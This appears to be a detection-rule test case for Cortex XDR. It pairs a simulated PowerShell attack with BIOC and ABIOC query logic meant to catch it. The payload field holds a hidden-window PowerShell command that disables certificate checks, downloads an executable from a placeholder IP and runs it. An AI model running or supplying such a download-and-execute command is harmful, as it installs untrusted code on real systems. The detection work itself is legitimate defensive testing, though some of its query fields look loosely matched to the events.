identity.name: Windows PowerShell with Rare TLS/HTTP User Agent Combination
identity.summary: An attacker uses PowerShell to download and execute a payload with a rare combination of TLS and HTTP User Agent headers, which triggers the ABIOC for abnormal communication. Cortex should detect this
identity.description: An attacker uses PowerShell to download and execute a payload with a rare combination of TLS and HTTP User Agent headers, which triggers the ABIOC for abnormal communication. Cortex should detect this behavior via process start and network telemetry.

payload.code: powershell.exe -WindowStyle Hidden -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.WebClient; $client.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'); $client.Headers.Add('Accept', '*/*'); $client.DownloadFile('http://192.0.2.10/payload.exe', 'C:\Users\Public\payload.exe'); Start-Process -FilePath 'C:\Users\Public\payload.exe'"

expected_artifacts.description: PowerShell process execution with hidden window
Outbound HTTP request with custom User-Agent

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: PowerShell Process with Custom User-Agent
biocs.description: Detection of PowerShell process starting with a rare combination of TLS and HTTP User-Agent headers
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_image_name = 'powershell.exe'
| filter action_remote_ip = '192.0.2.10'
| filter dst_port = 80

abiocs.name: Abnormal TLS/HTTP User-Agent Communication
abiocs.description: Detects a rare combination of TLS and HTTP User-Agent headers used in communication
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter action_remote_ip = '192.0.2.10'
| filter dst_port = 80
| filter action_process_image_name = 'powershell.exe'
| comp count() as events by action_remote_ip, agent_hostname
| sort desc events
abiocs.causality_anchor: powershell.exe process start with custom HTTP headers
